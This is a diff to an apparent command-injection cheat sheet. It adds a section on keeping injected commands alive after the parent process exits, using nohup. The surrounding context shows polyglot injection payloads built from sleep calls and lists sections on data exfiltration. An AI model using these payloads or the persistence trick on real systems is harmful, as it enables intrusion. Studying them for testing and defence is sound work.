@@ -25,6 +25,7 @@
 * [Time based data exfiltration](#time-based-data-exfiltration)
 * [DNS based data exfiltration](#dns-based-data-exfiltration)
 * [Polyglot command injection](#polyglot-command-injection)
+* [Backgrounding long running commands](#backgrounding-long-running-commands)
 * [References](#references)
     
 
@@ -302,6 +303,16 @@ e.g:
 echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
 echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
+```
+
+## Backgrounding long running commands
+
+In some instances, you might have a long running command that gets killed by the process injecting it timing out.
+
+Using nohup, you can keep the process running after the parent process exits.
+
+```bash
+nohup sleep 120 > /dev/null &
 ```
 
 ## Labs
